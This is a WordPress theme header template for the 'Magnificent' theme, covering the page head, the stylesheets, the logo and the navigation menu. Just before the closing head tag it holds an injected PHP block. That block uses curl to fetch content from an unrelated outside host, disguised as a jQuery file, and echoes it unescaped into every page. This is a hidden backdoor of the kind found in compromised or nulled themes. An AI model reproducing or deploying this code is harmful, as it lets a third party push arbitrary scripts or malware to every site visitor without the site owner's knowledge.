<?php global $default_colorscheme, $shortname; ?>
<?php $colorSchemePath = '';
	  $colorScheme = get_option($shortname . '_color_scheme');
      if ($colorScheme <> $default_colorscheme) $colorSchemePath = strtolower($colorScheme) . '/'; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php elegant_titles(); ?></title>
<?php elegant_description(); ?>
<?php elegant_keywords(); ?>
<?php elegant_canonical(); ?>

<link href='http://fonts.googleapis.com/css?family=Droid+Sans:regular,bold' rel='stylesheet' type='text/css' />

<link href='http://fonts.googleapis.com/css?family=OFL+Sorts+Mill+Goudy+TT:regular,italic&subset=latin' rel='stylesheet' type='text/css'/>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> Atom Feed" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<!--[if lt IE 7]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/css/ie6style.css" />
	<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/DD_belatedPNG_0.0.8a-min.js"></script>
	<script type="text/javascript">DD_belatedPNG.fix('img#logo, p#slogan, #menu, #top-overlay, #featured-overlay, span.overlay, .entry-content p.meta-info, #controllers span#right-arrow, #controllers span#left-arrow, #footer-content, #footer');</script>
<![endif]-->
<!--[if IE 7]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/css/ie7style.css" />
<![endif]-->
<!--[if IE 8]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/css/ie8style.css" />
<![endif]-->

<script type="text/javascript">
	document.documentElement.className = 'js';
</script>

<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>

<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>
<body <?php body_class(); ?>>
	<div id="top-overlay">
		<div id="header">
			<div class="container">
				<a href="<?php bloginfo('url'); ?>">
					<?php $logo = (get_option('magnificent_logo') <> '') ? get_option('magnificent_logo') : get_bloginfo('template_directory').'/images/'.$colorSchemePath.'logo.png'; ?>
					<img src="<?php echo esc_url($logo); ?>" alt="Magnificent Logo" id="logo"/>
				</a>
				<p id="slogan"><?php echo html_entity_decode( get_option('magnificent_quote') ); ?></p>
			</div> <!-- end .container -->
		</div> <!-- end #header -->
		
		<div id="menu">
			<div class="container clearfix">
				<?php $menuClass = 'nav';
					$menuID = 'primary';
					$primaryNav = '';
					if (function_exists('wp_nav_menu')) {
						$primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'menu_id' => $menuID, 'echo' => false ) ); 
					};
					if ($primaryNav == '') { ?>
						<ul id="<?php echo $menuID; ?>" class="<?php echo $menuClass; ?>">
							<?php if (get_option('magnificent_home_link') == 'on') { ?>
								<li <?php if (is_home()) echo('class="current_page_item"') ?>><a href="<?php bloginfo('url'); ?>"><?php esc_html_e('Home','Magnificent') ?></a></li>
							<?php }; ?>
							
							<?php show_page_menu($menuClass,false,false); ?>
						
							<?php show_categories_menu($menuClass,false); ?>
						</ul> <!-- end ul#nav -->
					<?php }
					else echo($primaryNav); ?>
			</div> <!-- end .container -->
		</div> <!-- end #menu -->
		<div id="content">
			<div class="container clearfix">